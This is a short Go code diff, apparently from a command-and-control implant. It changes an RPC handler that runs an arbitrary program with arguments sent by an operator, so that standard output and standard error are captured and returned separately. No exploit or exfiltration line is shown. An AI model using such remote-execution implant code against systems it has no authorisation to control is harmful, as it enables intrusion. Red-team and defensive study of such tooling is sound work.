@@ -377,9 +377,13 @@ func executeHandler(data []byte, resp RPCResponse) {
 	cmd := exec.Command(execReq.Path, execReq.Args...)
 
 	if execReq.Output {
-		res, err := cmd.CombinedOutput()
+		stdOut := new(bytes.Buffer)
+		stdErr := new(bytes.Buffer)
+		cmd.Stdout = stdOut
+		cmd.Stderr = stdErr
+		err := cmd.Run()
 		//{{if .Config.Debug}}
-		log.Println(string(res))
+		log.Println(string(stdOut.String()))
 		//{{end}}
 		if err != nil {
 			// Exit errors are not a failure of the RPC, but of the command.
@@ -391,7 +395,8 @@ func executeHandler(data []byte, resp RPCResponse) {
 				}
 			}
 		}
-		execResp.Result = string(res)
+		execResp.Stderr = stdErr.String()
+		execResp.Stdout = stdOut.String()
 	} else {
 		err = cmd.Start()
 		if err != nil {
